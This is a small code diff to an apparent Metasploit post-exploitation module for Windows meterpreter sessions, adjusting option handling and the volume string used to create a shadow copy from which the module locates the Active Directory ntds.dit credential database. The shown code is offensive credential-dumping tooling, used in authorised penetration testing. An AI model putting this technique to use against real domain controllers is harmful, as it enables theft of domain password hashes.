@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Post
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
   ))
-    deregister_options('RHOST','SMBUser','SMBPass', 'SMBDomain')
+    deregister_options('SMBUser','SMBPass', 'SMBDomain')
   end
 
   def run
@@ -144,7 +144,7 @@ class Metasploit3 < Msf::Post
   def vss_method
     location = ntds_location.dup
     volume = location.slice!(0,3)
-    id = create_shadowcopy("#{volume}\\")
+    id = create_shadowcopy("#{volume}")
     print_status "Getting Details of ShadowCopy #{id}"
     sc_details = get_sc_details(id)
     sc_path = "#{sc_details['DeviceObject']}\\#{location}\\ntds.dit"
